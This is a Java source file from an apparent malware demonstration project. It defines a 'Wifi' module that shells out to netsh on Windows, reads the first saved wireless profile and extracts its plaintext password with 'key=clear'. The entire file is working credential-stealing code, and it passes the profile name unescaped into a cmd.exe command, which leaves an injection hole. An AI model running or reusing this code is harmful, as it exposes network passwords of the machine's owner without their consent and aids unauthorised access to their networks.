package malware.java.Demo.Demos;

import malware.java.Demo.Demo;
import malware.java.Utils.FormatUtils;

import java.io.IOException;
import java.util.Scanner;

public class Wifi extends Demo {
    public Wifi() {
        super("Wifi", "Grabs wifi name and password");
    }

    @Override
    public String demo() {
        try {
            String command = "cmd /c call netsh.exe wlan show profiles";
            Process child = Runtime.getRuntime().exec(command);

            Scanner sc = new Scanner(child.getInputStream());
            while (sc.hasNextLine()) {
                String s = sc.nextLine();
                if (s.contains("All User Profile")) {
                    String split[] = s.split("\\s+");
                    String m = "";
                    for (int i = 5; i < split.length; i++) {
                        if (i == split.length - 1) {
                            m += split[i];
                        } else {
                            m += split[i] + " ";
                        }
                    }

                    if (m != null) {
                        return "SSID: " + m + " Password: " + wifiPassword(m);
                    }
                }
            }
            sc.close();
        } catch (IOException e) {
        }
        return FormatUtils.INSTANCE.red + "Failure";
    }

    public String wifiPassword(String name) {
        String pass = "";

        try {
            ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c",
                    "netsh.exe wlan show profiles name=\"" + name + "\" key=clear");
            builder.redirectErrorStream(true);
            Process p;
            p = builder.start();

            Scanner sc = new Scanner(p.getInputStream());

            while (sc.hasNextLine()) {
                String line = sc.nextLine();

                if (line != null && line.contains("Key Content")) {
                    String[] split = line.split("\\s+");
                    pass = split[4];
                    break;
                }
            }

        } catch (IOException e) {
            e.printStackTrace();
        }

        return pass;
    }
}
